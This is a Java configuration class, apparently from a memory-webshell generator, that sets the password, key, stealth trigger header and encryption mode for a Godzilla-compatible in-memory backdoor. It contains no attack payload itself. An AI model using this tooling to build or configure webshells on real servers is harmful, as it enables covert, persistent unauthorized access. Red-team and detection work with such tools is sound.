package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import com.reajason.javaweb.memshell.config.ConfigField;
import com.reajason.javaweb.memshell.config.HeaderAware;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.javaweb.utils.StringUtils;
import lombok.*;
import lombok.experimental.SuperBuilder;

/**
 * 哥斯拉 HW 内存马配置。
 * <p>
 * {@code cryption} 决定生成哪一套协议模板（见 {@link GodzillaHwCryption}），
 * 连接时哥斯拉客户端的加密器必须与之一致。
 *
 * @author ReaJason
 */
@Getter
@SuperBuilder(toBuilder = true)
@NoArgsConstructor
@AllArgsConstructor
@ToString
public class GodzillaHwConfig extends ShellToolConfig implements HeaderAware {
    @ConfigField
    @Builder.Default
    private String pass = CommonUtil.getRandomString(8);
    @ConfigField
    @Builder.Default
    private String key = CommonUtil.getRandomString(8);
    @ConfigField
    @Builder.Default
    private String headerName = "User-Agent";
    @ConfigField
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);
    @ConfigField(label = "加密器", placeholder = "选择与客户端一致的加密器")
    @Builder.Default
    private GodzillaHwCryption cryption = GodzillaHwCryption.JAVA_AES_BASE64;

    public GodzillaHwCryption getCryption() {
        return cryption == null ? GodzillaHwCryption.JAVA_AES_BASE64 : cryption;
    }

    public static abstract class GodzillaHwConfigBuilder<C extends GodzillaHwConfig, B extends GodzillaHwConfigBuilder<C, B>>
            extends ShellToolConfig.ShellToolConfigBuilder<C, B> {
        public B pass(final String pass) {
            if (StringUtils.isNotBlank(pass)) {
                this.pass$value = pass;
                this.pass$set = true;
            }
            return self();
        }

        public B key(final String key) {
            if (StringUtils.isNotBlank(key)) {
                this.key$value = key;
                this.key$set = true;
            }
            return self();
        }

        public B headerName(final String headerName) {
            if (StringUtils.isNotBlank(headerName)) {
                this.headerName$value = headerName;
                this.headerName$set = true;
            }
            return self();
        }

        public B headerValue(final String headerValue) {
            if (StringUtils.isNotBlank(headerValue)) {
                this.headerValue$value = headerValue;
                this.headerValue$set = true;
            }
            return self();
        }
    }
}
